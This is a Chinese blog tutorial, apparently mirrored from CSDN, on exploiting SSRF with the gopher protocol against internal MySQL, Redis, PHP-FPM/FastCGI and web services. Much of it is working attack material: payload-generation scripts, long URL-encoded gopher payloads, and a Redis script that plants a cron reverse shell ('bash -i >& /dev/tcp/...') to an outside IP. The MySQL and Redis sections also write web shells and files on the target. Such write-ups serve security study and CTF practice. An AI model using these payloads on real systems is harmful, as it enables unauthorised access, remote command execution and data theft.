\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[blog.csdn.net\](https://blog.csdn.net/qq\_41107295/article/details/103026470)

1 概述
----

Gopher 协议可以做很多事情，特别是在 SSRF 中可以发挥很多重要的作用。利用此协议可以攻击内网的 FTP、Telnet、Redis、Memcache，也可以进行 GET、POST 请求。这无疑极大拓宽了 SSRF 的攻击面。  
gopher：gopher 协议支持发出 GET、POST 请求：可以先截获 get 请求包和 post 请求包，再构造成符合 gopher 协议的请求。gopher 协议是 ssrf 利用中一个最强大的协议（俗称万能协议）

Gopher 协议是 HTTP 协议出现之前，在 Internet 上常见且常用的一个协议。在 ssrf 时常常会用到 gopher 协议构造 post 包来攻击内网应用。其实构造方法很简单，与 http 协议很类似。  
不同的点在于 **gopher 协议没有默认端口，所以需要指定 web 端口，而且需要指定 post 方法。回车换行使用 %0d%0a。注意 post 参数之间的 & 分隔符也要进行 url 编码  
基本协议格式：`URL:gopher://<host>:<port>/<gopher-path>_后接TCP数据流`**

简单实例
----

**gopher 协议简单应用**

```
gopher://<host>:<port>/<gopher-path>\_后接TCP数据流

```

```
$ curl gopher://localhost:2222/hello%0agopher

```

```
$ nc -lvvp 2222
listening on \[any\] 2222 ...
connect to \[127.0.0.1\] from localhost \[127.0.0.1\] 34116
ello
gopher

```

通过 nc 回显可以发现，数据换行了， 然而 hello 只回显了 ello ，也就是说 h “被吃了”, 因此要在传输的数据前家一个无用字符

```
$ curl gopher://localhost:2222/\_hello%0agopher

```

注：  
注意如果在地址栏利用 payload 时要再进行一次 url 编码。

```
http://192.168.91.130/ssrf.php?url=gopher://localhost:2222/\_hello%250agopher

```

下面先看一个利用 gopher 协议简单例子  
此代码用来模拟 SSRF，使用 curl 发起网络请求后返回客户端，请求加载文件

```
<?php
$ch = curl\_init(); // 创建一个新cURL资源
curl\_setopt($ch, CURLOPT\_URL, $\_GET\['url'\]); // 设置URL和相应的选项
#curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, 1);
curl\_setopt($ch, CURLOPT\_HEADER, 0);
#curl\_setopt($ch, CURLOPT\_PROTOCOLS, CURLPROTO\_HTTP | CURLPROTO\_HTTPS);
curl\_exec($ch); // 抓取URL并把它传递给浏览器
curl\_close($ch); // 关闭cURL资源，并且释放系统资源
?>

```

上面的漏洞代码 ssrf.php 没有屏蔽回显，所以利用姿势比较多  
![](https://img-blog.csdnimg.cn/20191112123924362.png)  
![](https://img-blog.csdnimg.cn/20191112124710830.png)

gopher 攻击 Mysql
---------------

**MySQL 通信协议**  
**MySQL 连接方式：**

在进行利用 SSRF 攻击 MySQL 之前，先了解一下 MySQL 的通信协议。MySQL 分为服务端和客户端，客户端连接服务器使存在三种方法：

```
Unix套接字；
内存共享/命名管道；
TCP/IP套接字；

```

*   在 Linux 或者 Unix 环境下，当我们输入 mysql–uroot –proot 登录 MySQL 服务器时就是用的 Unix 套接字连接；Unix 套接字其实不是一个网络协议，只能在客户端和 Mysql 服务器在同一台电脑上才可以使用。
    
*   在 window 系统中客户端和 Mysql 服务器在同一台电脑上，可以使用命名管道和共享内存的方式。
    
*   TCP/IP 套接字是在任何系统下都可以使用的方式，也是使用最多的连接方式，当我们输入 mysql–h127.0.0.1 –uroot –proot 时就是要 TCP/IP 套接字。  
    所以当我们需要抓取 mysql 通信数据包时必须使用 TCP/IP 套接字连接。
    

**MySQL 认证过程**

MySQL 客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。

*   当需要密码认证时使用挑战应答模式，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证
*   当无需密码认证时直接发送 TCP/IP 数据包即可

所以在非交互模式下登录并操作 MySQL 只能在无需密码认证，未授权情况下进行，利用 SSRF 漏洞攻击 MySQL 也是在其未授权情况下进行的。

MySQL 客户端与服务器的交互主要分为两个阶段：连接阶段或者叫认证阶段和命令阶段。在连接阶段包括握手包和认证包，这里主要关注认证数据包。  
认证数据包格式：  
![](https://img-blog.csdnimg.cn/20191112131647463.png)  
下面我们抓包分析一下 mysql 请求与响应的过程。  
环境：Ubuntu-18.04

```
\# 一个窗口抓包
tcpdump –i lo port 3306 –w mysql.pcay
# 一个窗口操作
mysql –h 127.0.0.1 –u root -p
# 执行了以下语句
use test;
select \* from flag;
exit;

```

打开 mysql.pcay 分析流量包  
用 root 登陆的 MySQL 认证数据包

![](https://img-blog.csdnimg.cn/20191112142252115.png)  
![](https://img-blog.csdnimg.cn/20191112142355393.png)  
![](https://img-blog.csdnimg.cn/20191112142524702.png)  
这里 Packet Length 为整个数据包的长度，Packet Number 为 sequence\_id 随每个数据包递增，从 0 开始，命令执行阶段遇到命令重新重置为 0。这两个 Packet 为整个 MySQL 通协议的基础数据包。  
`select * from flag`请求数据包

![](https://img-blog.csdnimg.cn/2019111214291171.png)  
请求结果响应包  
![](https://img-blog.csdnimg.cn/20191112143005666.png)

**构造攻击数据包**  
通过上面 MySQL 通信协议的分析，现在需要构造一个基于 TCP/IP 的数据包，包括连接，认证，执行命令，退出等 MySQL 通信数据。  
首先我们需要新建一个 MySQL 用户，并且密码为空，使用 root 用户登录 mysql 后执行如下命令即可：

```
新建用户
CREATE USER 'curl'@'localhost';
GRANT ALL ON \*.\* TO 'curl'@'localhost';

```

上面我们新建了一个用户 curl，接下来开始抓包分析。

```
过程和上面一样
第一步开一个窗口抓包：
root@ubuntu17:/#tcpdump–i lo port 3306 –w mysql.pcay
第二步开一个窗口使用TCP/IP模式连接MySQL服务器：
root@ubuntu17:/#mysql–h 127.0.0.1 –u curl
执行语句...

```

打开数据包后过滤 mysql 数据包，然后随便选一个 mysql 数据包邮件追踪流，TCP 流，然后过滤出客户端发送到 MySQL 服务器的数据包，就是发给 3306 的数据，将显示格式调整为原始数据即可，此时获取的就是整个 MySQL 客户端连接服务器并且执行命令到退出发送的数据包内容  
HEX 转储如下，  
![](https://img-blog.csdnimg.cn/20191112145208747.png)  
保存为原始数据，将数据转化为 url 编码。  
![](https://img-blog.csdnimg.cn/20191112145629589.png)

```
#coding:utf-8

def results(s):
    a=\[s\[i:i+2\] for i in xrange(0,len(s),2)\]
    return "curl gopher://127.0.0.1:3306/\_%"+"%".join(a)
if \_\_name\_\_=="\_\_main\_\_":
    import sys
    s=sys.argv\[1\]
    print(results(s))

```

![](https://img-blog.csdnimg.cn/20191112151117233.png)

![](https://img-blog.csdnimg.cn/20191112150931913.png)

成功查询到数据库内容  
![](https://img-blog.csdnimg.cn/20191112150811546.png)

**简单应用**

```
<?php
$url = @$\_GET\['url'\];
if($url) {
    $ch = curl\_init();
    curl\_setopt($ch, CURLOPT\_URL, $url);
    curl\_setopt($ch, CURLOPT\_RETURNTRANSFER, 1);
    curl\_setopt($ch, CURLOPT\_HEADER, 0);
    curl\_setopt($ch, CURLOPT\_SSL\_VERIFYPEER, false);
    curl\_setopt($ch, CURLOPT\_SSL\_VERIFYHOST, false);
    $co = curl\_exec($ch);
    curl\_close($ch);
    echo $co;
}
?>

```

正常情况下我们是不可能访问内网的，在存在 ssrf 的情况下我们可以通过 gopher 协议访问本地读取数据。

注意：如果 ssrf 的点是 get 参数，因为处于 url 中，则需要进行一次 url 编码，将上述例子再进行一次编码：

```
payload:
?url=gopher://127.0.0.1:3306/\_%25a2%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2563%2575%2572%256c%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2565%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2504%2534%2533%2531%2537%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2537%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%2521%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256f%256e%255f%2563%256f%256d%256d%2565%256e%2574%2520%256c%2569%256d%2569%2574%2520%2531%2512%2500%2500%2500%2503%2553%2545%254c%2545%2543%2554%2520%2544%2541%2554%2541%2542%2541%2553%2545%2528%2529%2505%2500%2500%2500%2502%2574%2565%2573%2574%250f%2500%2500%2500%2503%2573%2568%256f%2577%2520%2564%2561%2574%2561%2562%2561%2573%2565%2573%250c%2500%2500%2500%2503%2573%2568%256f%2577%2520%2574%2561%2562%256c%2565%2573%2506%2500%2500%2500%2504%2566%256c%2561%2567%2500%2506%2500%2500%2500%2504%2575%2573%2565%2572%2500%2513%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2566%256c%2561%2567%2501%2500%2500%2500%2501

```

![](https://img-blog.csdnimg.cn/20191112152547746.png)  
便达到了 mysql 未授权访问数据内容的目的。  
当然 payload 生成除了文中方法可以使用 gopherus.py 及 [mysql\_gopher\_attack](https://github.com/FoolMitAh/mysql_gopher_attack)。  
这里用 gopherus.py

![](https://img-blog.csdnimg.cn/20191112153509595.png)  
![](https://img-blog.csdnimg.cn/20191112153306631.png)

很多情况下，SSRF 是没有回显的。  
我们可以通过 mysql 执行 select into outfile，当前用户必须存在 file 权限，以及导出到`--secure-file-priv`指定目录下，并且导入目录需要有写权限。

如我们读取下文件内容：  
**通过 load\_file() 函数将文件内容爆出来**  
前提条件

*   当前权限对该文件可读
*   文件在该服务器上
*   路径完整
*   文件大小小于 max\_allowed\_packet
*   当前数据库用户有 FILE 权限  
    `secure_file_priv`的值为空，可以对任意目录读取如果值为某目录 (/tmp/)，那么就只能对该目录的文件进行操作  
    ![](https://img-blog.csdnimg.cn/2019111314094411.png)  
    ![](https://img-blog.csdnimg.cn/20191113141047758.png)  
    ![](https://img-blog.csdnimg.cn/20191113141110614.png)  
    **通过 SELECT…INTO OUTFILE 写文件**  
    前提条件
*   目标目录要有可写权限
*   当前数据库用户要有 FILE 权限
*   目标文件不能已存在
*   secure\_file\_priv 的值为空，或已知指定目录
*   路径完整  
    访问

```
http://192.168.198.134/ssrf/ssrf-gopher.php?url=gopher%3a%2f%2f127.0.0.1%3a3306%2f\_%25a3%2500%2500%2501%2585%25a6%25ff%2501%2500%2500%2500%2501%2521%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2500%2563%2575%2572%256c%2500%2500%256d%2579%2573%2571%256c%255f%256e%2561%2574%2569%2576%2565%255f%2570%2561%2573%2573%2577%256f%2572%2564%2500%2566%2503%255f%256f%2573%2505%254c%2569%256e%2575%2578%250c%255f%2563%256c%2569%2565%256e%2574%255f%256e%2561%256d%2565%2508%256c%2569%2562%256d%2579%2573%2571%256c%2504%255f%2570%2569%2564%2505%2532%2537%2532%2535%2535%250f%255f%2563%256c%2569%2565%256e%2574%255f%2576%2565%2572%2573%2569%256f%256e%2506%2535%252e%2537%252e%2532%2532%2509%255f%2570%256c%2561%2574%2566%256f%2572%256d%2506%2578%2538%2536%255f%2536%2534%250c%2570%2572%256f%2567%2572%2561%256d%255f%256e%2561%256d%2565%2505%256d%2579%2573%2571%256c%255b%2500%2500%2500%2503%2573%2565%256c%2565%2563%2574%2520%2527%252a%252f%2531%2520%252a%2520%252a%2520%252a%2520%252a%2520%2562%2561%2573%2568%2520%252d%2569%2520%253e%2526%2520%252f%2564%2565%2576%252f%2574%2563%2570%252f%2531%2539%2532%252e%2531%2536%2538%252e%2530%252e%2531%2532%252f%2538%2531%2532%2533%2520%2530%253e%2526%2531%2527%2520%2569%256e%2574%256f%2520%256f%2575%2574%2566%2569%256c%2565%2520%2522%252f%2574%256d%2570%252f%2573%2568%2565%256c%256c%2522%253b%2501%2500%2500%2500%2501

```

![](https://img-blog.csdnimg.cn/20191113141549699.png)  
![](https://img-blog.csdnimg.cn/2019111314144091.png)  
![](https://img-blog.csdnimg.cn/20191113141610871.png)  
ubuntu 用户的定时任务在 /var/spool/cron/crontabs/ 目录下，所以这里是不可能反弹的，仅作为写文件的演示，这就看出了`secure_file_priv`目录的限制，在不限制目录的情况下，我们可以通过 php 或 bash 任意写入 shell。  
还可以通过 udf 反弹 shell 直接执行系统命令。不再演示，借鉴下图  
执行完一系列导出 udf 到 plugin 的命令后，即可直接执行系统命令执行，如下图所示反弹 shell：  
![](https://img-blog.csdnimg.cn/20191113150912845.png)  
原理都是利用 SSRF 拿 Gopher 协议发送构造好的 TCP/IP 数据包攻击 mysql

参考：https://paper.seebug.org/510/#06  
http://shaobaobaoer.cn/archives/643/gopher-8de8ae-ssrf-mysql-a0e7b6

Gopher 攻击内网 Redis
-----------------

Redis 任意文件写入现在已经成为十分常见的一个漏洞，一般内网中会存在 root 权限运行的 Redis 服务，利用 Gopher 协议可以攻击内网中的 Redis

常见 redis 反弹 shell 的 bash 脚本

```
redis-cli -h $1 -p $2 flushall
echo -e "\\n\\n\*/1 \* \* \* \* bash -i >& /dev/tcp/192.168.0.12/8080 0>&1\\n\\n"|redis-cli -h $1 -p $2 -x set 1
redis-cli -h $1 -p $2 config set dir /var/spool/cron/
redis-cli -h $1 -p $2 config set dbfilename root
redis-cli -h $1 -p $2 save
redis-cli -h $1 -p $2 quit

```

flushall：删除所有数据库中的所有 key。  
\-x 参数：从标准输入读取一个参数：  
在 redis 的第 0 个数据库中添加 key 为 1，value 为`\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/2333 0>&1\n\n\n`的字段。这里用的 centos，ubuntu 用户的定时任务在 /var/spool/cron/crontabs/ 目录下，最后会多出一个 n 是因为 echo 重定向最后会自带一个换行符。  
dir 数据库备份的文件放置路径  
Dbfilename 备份文件的文件名

执行脚本命令：`bash shell.sh 127.0.0.1 6379`  
想获取 Redis 攻击的 TCP 数据包，可以使用 socat 进行端口转发，利用这个脚本攻击自身并抓包得到数据流：转发命令如下：  
`socat -v tcp-listen:4444,fork tcp-connect:localhost:6379`  
意思是将本地的 4444 端口转发到本地的 6379 端口。访问该服务器的 4444 端口，访问的其实是该服务器的 6379 端口。  
然后执行`bash shell.sh 127.0.0.1 4444`  
捕获到的数据：

```
\[root@localhost yum.repos.d\]# socat -v tcp-listen:4444,fork tcp-connect:localhost:6379
> 2019/11/12 17:32:38.075661  length=18 from=0 to=17
\*1\\r
$8\\r
flushall\\r
< 2019/11/12 17:32:38.078921  length=5 from=0 to=4
+OK\\r
> 2019/11/12 17:32:38.125327  length=86 from=0 to=85
\*3\\r
$3\\r
set\\r
$1\\r
1\\r
$59\\r


\*/1 \* \* \* \* bash -i >& /dev/tcp/192.168.0.12/8080 0>&1


\\r
< 2019/11/12 17:32:38.126302  length=5 from=0 to=4
+OK\\r
> 2019/11/12 17:32:38.176645  length=57 from=0 to=56
\*4\\r
$6\\r
config\\r
$3\\r
set\\r
$3\\r
dir\\r
$16\\r
/var/spool/cron/\\r
< 2019/11/12 17:32:38.177693  length=5 from=0 to=4
+OK\\r
> 2019/11/12 17:32:38.198131  length=52 from=0 to=51
\*4\\r
$6\\r
config\\r
$3\\r
set\\r
$10\\r
dbfilename\\r
$4\\r
root\\r
< 2019/11/12 17:32:38.199579  length=5 from=0 to=4
+OK\\r
> 2019/11/12 17:32:38.242719  length=14 from=0 to=13
\*1\\r
$4\\r
save\\r
< 2019/11/12 17:32:38.244480  length=5 from=0 to=4
+OK\\r
> 2019/11/12 17:32:38.275115  length=14 from=0 to=13
\*1\\r
$4\\r
quit\\r
< 2019/11/12 17:32:38.281519  length=5 from=0 to=4
+OK\\r


```

![](https://img-blog.csdnimg.cn/20191112173659166.png)  
转换规则如下：

*   如果第一个字符是 > 或者 < 那么丢弃该行字符串，表示请求和返回的时间。
*   如果前 3 个字符是 + OK 那么丢弃该行字符串，表示返回的字符串。
*   将 \\ r 字符串替换成 %0d%0a
*   空白行替换为 %0a

JoyChou 师傅的转换脚本

```
#coding: utf-8
#author: JoyChou
import sys

exp = ''

with open(sys.argv\[1\]) as f:
    for line in f.readlines():
        if line\[0\] in '><+':
            continue
        # 判断倒数第2、3字符串是否为\\r
        elif line\[-3:-1\] == r'\\r':
            # 如果该行只有\\r，将\\r替换成%0a%0d%0a
            if len(line) == 3:
                exp = exp + '%0a%0d%0a'
            else:
                line = line.replace(r'\\r', '%0d%0a')
                # 去掉最后的换行符
                line = line.replace('\\n', '')
                exp = exp + line
        # 判断是否是空行，空行替换为%0a
        elif line == '\\x0a':
            exp = exp + '%0a'
        else:
            line = line.replace('\\n', '')
            exp = exp + line
print exp


```

![](https://img-blog.csdnimg.cn/20191112174210130.png)  
如果要换 IP 和端口，前面的`$59`也需要更改，`$59`表示字符串长度为`59`个字节，上面的 EXP 即是`%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/192.168.0.12/8080 0>&1%0a%0a%0a%0a`。  
本地 curl 测试，返回 OK 说明 redis 命令成功执行  
![](https://img-blog.csdnimg.cn/20191112175018551.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMTA3Mjk1,size_16,color_FFFFFF,t_70)  
![](https://img-blog.csdnimg.cn/2019111217515171.png)  
shell 成功写入。  
![](https://img-blog.csdnimg.cn/20191112204314688.png)

我们也可以通过一句话方式写入网站目录下，从而执行命令，方法和上面一样  
这里不再演示了，直接使用上面用过的 gopherus.py

![](https://img-blog.csdnimg.cn/20191112195543246.png)

```
curl -v 'gopher://127.0.0.1:6379/\_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2422%0D%0A%0A%0A%3C%3Fphp%20phpinfo%28%29%3B%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A'

```

![](https://img-blog.csdnimg.cn/20191112195627811.png)  
成功写入 www 目录下，访问 shell.php  
![](https://img-blog.csdnimg.cn/20191112195721342.png)  
参考：https://blog.chaitin.cn/gopher-attack-surfaces/  
https://damit5.com/2018/05/26/SSRF-%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#0x04-%E6%94%BB%E5%87%BBRedis

Gopher 攻击 FastCGI
-----------------

一般来说 FastCGI 都是绑定在 127.0.0.1 端口上的，但是利用 Gopher+SSRF 可以完美攻击 FastCGI 执行任意命令。  
p 神介绍 FastCGI 的文章：https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html  
利用条件

*   libcurl 版本 >=7.45.0(由于 EXP 里有 %00，CURL 版本小于 7.45.0 的版本，gopher 的 %00 会被截断)
*   PHP-FPM 监听端口
*   PHP-FPM 版本 >= 5.3.3
*   知道服务器上任意一个 php 文件的绝对路径

转换为 Gopher 的 EXP  
监听一个端口的流量 `nc -lvvp 2333 > 1.txt`，执行 EXP，流量打到 2333 端口

```
python fpm.py -c "<?php system('echo sectest > /tmp/1.php'); exit;?>" -p 2333 127.0.0.1 php文件绝对路径

```

fpm.py 地址 https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75  
url 编码

```
f = open('1.txt')
ff = f.read()
from urllib import quote
print quote(ff)

```

得到 gopher 的 exp

```
curl 'gopher://127.0.0.1:9000/\_%01%01%97%9C%00%08%00%00%00%01%00%00%00%00%00%00%01%04%97%9C%01%D5%00%00%0E%02CONTENT\_LENGTH50%0C%10CONTENT\_TYPEapplication/text%0B%04REMOTE\_PORT9985%0B%09SERVER\_NAMElocalhost%11%0BGATEWAY\_INTERFACEFastCGI/1.0%0F%0ESERVER\_SOFTWAREphp/fcgiclient%0B%09REMOTE\_ADDR127.0.0.1%0F%15SCRIPT\_FILENAME/var/www/html/123.php%0B%15SCRIPT\_NAME/var/www/html/123.php%09%1FPHP\_VALUEauto\_prepend\_file%20%3D%20php%3A//input%0E%04REQUEST\_METHODPOST%0B%02SERVER\_PORT80%0F%08SERVER\_PROTOCOLHTTP/1.1%0C%00QUERY\_STRING%0F%16PHP\_ADMIN\_VALUEallow\_url\_include%20%3D%20On%0D%01DOCUMENT\_ROOT/%0B%09SERVER\_ADDR127.0.0.1%0B%15REQUEST\_URI/var/www/html/123.php%01%04%97%9C%00%00%00%00%01%05%97%9C%002%00%00%3C%3Fphp%20system%28%27echo%20sectest%20%3E%20/tmp/1.php%27%29%3B%20exit%3B%3F%3E%01%05%97%9C%00%00%00%00'

```

转：  
https://www.smi1e.top/gopher-ssrf%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91%E5%BA%94%E7%94%A8%E5%A4%8D%E7%8E%B0/  
https://blog.chaitin.cn/gopher-attack-surfaces/#h2.3\_%E6%94%BB%E5%87%BB-fastcgi

攻击内网 Vulnerability Web
----------------------

Gopher 可以模仿 POST 请求，故探测内网的时候不仅可以利用 GET 形式的 PoC（经典的 Struts2），还可以使用 POST 形式的 PoC。  
简单例题：  
题目不给源码  
一个只能 127.0.0.1 访问的 eval.php，内容为：

```
<?php 
class System{
    public $result='post a ctf to system';
    public $system;
    function  \_\_construct($system){
        $this->system=$system;       
    }
    function ad(){
        system($this->system);
    }
    function hint(){
        echo $this->result;
    }
}
$system =@$\_POST\['ctf'\];
if($\_SERVER\['REMOTE\_ADDR'\] == '127.0.0.1'){  
    $a = new System($system);
    $a->ad();
}
else{
    if($system!=null){
        echo '只有本地可以访问！';
    }
    else{
    $a = new System($system);
    $a->hint();
    }
}
?>  

```

```
<?php
$ch = curl\_init(); // 创建一个新cURL资源
curl\_setopt($ch, CURLOPT\_URL, $\_GET\['url'\]); // 设置URL和相应的选项
#curl\_setopt($ch, CURLOPT\_FOLLOWLOCATION, 1);
curl\_setopt($ch, CURLOPT\_HEADER, 0);
#curl\_setopt($ch, CURLOPT\_PROTOCOLS, CURLPROTO\_HTTP | CURLPROTO\_HTTPS);
curl\_exec($ch); // 抓取URL并把它传递给浏览器
curl\_close($ch); // 关闭cURL资源，并且释放系统资源
?>
<!--hint:eval.php-->

```

访问可知是传入参数 url，源代码提示 eval.php，进去传入参数后显示只能本地，猜测 ssrf 利用去执行命令。  
构造 post 数据包，我们可以抓包去构造  
![](https://img-blog.csdnimg.cn/20191113181742471.png)

```
POST /ssrfme/post/eval.php HTTP/1.1
Host: 127.0.0.1
Content-Length: 13
Cache-Control: max-age=0
Origin: http://127.0.0.1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,\*/\*;q=0.8,application/signed-exchange;v=b3
Referer: http://127.0.0.1/ssrfme/post/eval.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: SL\_G\_WPT\_TO=zh; SL\_GWPT\_Show\_Hide\_tmp=1; SL\_wptGlobTipTmp=1
Connection: close

ctf=type+flag

```

通过如下脚本

```
#coding: utf-8
from urllib import quote

#post 数据 通过BP抓包获取
f = open('post.txt')
post = f.read()
s = post.encode('hex')

#也可以抓流量包保存原始数据hex
# s='504f5354202f737372666d652f706f73742f6576616c2e70687020485454502f312e310d0a486f73743a203132372e302e302e310d0a436f6e6e656374696f6e3a206b6565702d616c6976650d0a436f6e74656e742d4c656e6774683a2031310d0a43616368652d436f6e74726f6c3a206d61782d6167653d300d0a4f726967696e3a20687474703a2f2f3132372e302e302e310d0a557067726164652d496e7365637572652d52657175657374733a20310d0a436f6e74656e742d547970653a206170706c69636174696f6e2f782d7777772d666f726d2d75726c656e636f6465640d0a557365722d4167656e743a204d6f7a696c6c612f352e30202857696e646f7773204e542031302e303b2057696e36343b2078363429204170706c655765624b69742f3533372e333620284b48544d4c2c206c696b65204765636b6f29204368726f6d652f37382e302e333930342e3937205361666172692f3533372e33360d0a5365632d46657463682d557365723a203f310d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c696d6167652f776562702c696d6167652f61706e672c2a2f2a3b713d302e382c6170706c69636174696f6e2f7369676e65642d65786368616e67653b763d62330d0a5365632d46657463682d536974653a2073616d652d6f726967696e0d0a5365632d46657463682d4d6f64653a206e617669676174650d0a526566657265723a20687474703a2f2f3132372e302e302e312f737372666d652f706f73742f6576616c2e7068700d0a4163636570742d456e636f64696e673a20677a69702c206465666c6174652c2062720d0a4163636570742d4c616e67756167653a207a682d434e2c7a683b713d302e390d0a436f6f6b69653a20534c5f475f5750545f544f3d7a683b20534c5f475750545f53686f775f486964655f746d703d313b20534c5f777074476c6f62546970546d703d310d0a0d0a653d747970652b666c6167'

len=len(s)
p=''
for i in range(len)\[::2\]:
    p+=quote(chr(int(s\[i:i+2\],16)))
# print(p)

#若url浏览器访问需再编码一次，curl可直接访问
urlp = quote(p)
urlp = 'gopher://127.0.0.1:80/\_' + urlp
print(urlp)

```

```
poyload: gopher://127.0.0.1:80/\_POST%2520/ssrfme/post/eval.php%2520HTTP/1.1%250AHost%253A%2520127.0.0.1%250AContent-Length%253A%252013%250ACache-Control%253A%2520max-age%253D0%250AOrigin%253A%2520http%253A//127.0.0.1%250AUpgrade-Insecure-Requests%253A%25201%250AContent-Type%253A%2520application/x-www-form-urlencoded%250AUser-Agent%253A%2520Mozilla/5.0%2520%2528Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64%2529%2520AppleWebKit/537.36%2520%2528KHTML%252C%2520like%2520Gecko%2529%2520Chrome/78.0.3904.97%2520Safari/537.36%250AAccept%253A%2520text/html%252Capplication/xhtml%252Bxml%252Capplication/xml%253Bq%253D0.9%252Cimage/webp%252Cimage/apng%252C%252A/%252A%253Bq%253D0.8%252Capplication/signed-exchange%253Bv%253Db3%250AReferer%253A%2520http%253A//127.0.0.1/ssrfme/post/eval.php%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%250ACookie%253A%2520SL\_G\_WPT\_TO%253Dzh%253B%2520SL\_GWPT\_Show\_Hide\_tmp%253D1%253B%2520SL\_wptGlobTipTmp%253D1%250AConnection%253A%2520close%250A%250Actf%253Dtype%252Bflag

```

![](https://img-blog.csdnimg.cn/2019111320203928.png)  
也可 curl 直接访问  
![](https://img-blog.csdnimg.cn/20191113202459635.png)

也可用上面攻击 mysql 抓流量包的方式，其实和 bp 抓包一样

![](https://img-blog.csdnimg.cn/20191113202639965.png)

![](https://img-blog.csdnimg.cn/20191113202723838.png)  
保存原始数据，就是十六进制，数据包也可以，转一下就行，脚本如下

```
#coding:utf-8
from urllib import quote

def hex():
	#post 数据 通过BP抓包获取
	f = open('post.txt')
	post = f.read()
	s = post.encode('hex')
	return s
def results(s):
    a=\[s\[i:i+2\] for i in xrange(0,len(s),2)\]
    return "gopher://127.0.0.1:80/\_%"+"%".join(a)


if \_\_name\_\_=="\_\_main\_\_":

    results = results(hex())
    # print(results)
    # url访问需再次编码
    url = quote(results)
    print(url)

```

```
payload:  gopher%3A//127.0.0.1%3A80/\_%2550%254f%2553%2554%2520%252f%2573%2573%2572%2566%256d%2565%252f%2570%256f%2573%2574%252f%2565%2576%2561%256c%252e%2570%2568%2570%2520%2548%2554%2554%2550%252f%2531%252e%2531%250a%2548%256f%2573%2574%253a%2520%2531%2532%2537%252e%2530%252e%2530%252e%2531%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2531%2533%250a%2543%2561%2563%2568%2565%252d%2543%256f%256e%2574%2572%256f%256c%253a%2520%256d%2561%2578%252d%2561%2567%2565%253d%2530%250a%254f%2572%2569%2567%2569%256e%253a%2520%2568%2574%2574%2570%253a%252f%252f%2531%2532%2537%252e%2530%252e%2530%252e%2531%250a%2555%2570%2567%2572%2561%2564%2565%252d%2549%256e%2573%2565%2563%2575%2572%2565%252d%2552%2565%2571%2575%2565%2573%2574%2573%253a%2520%2531%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250a%2555%2573%2565%2572%252d%2541%2567%2565%256e%2574%253a%2520%254d%256f%257a%2569%256c%256c%2561%252f%2535%252e%2530%2520%2528%2557%2569%256e%2564%256f%2577%2573%2520%254e%2554%2520%2531%2530%252e%2530%253b%2520%2557%2569%256e%2536%2534%253b%2520%2578%2536%2534%2529%2520%2541%2570%2570%256c%2565%2557%2565%2562%254b%2569%2574%252f%2535%2533%2537%252e%2533%2536%2520%2528%254b%2548%2554%254d%254c%252c%2520%256c%2569%256b%2565%2520%2547%2565%2563%256b%256f%2529%2520%2543%2568%2572%256f%256d%2565%252f%2537%2538%252e%2530%252e%2533%2539%2530%2534%252e%2539%2537%2520%2553%2561%2566%2561%2572%2569%252f%2535%2533%2537%252e%2533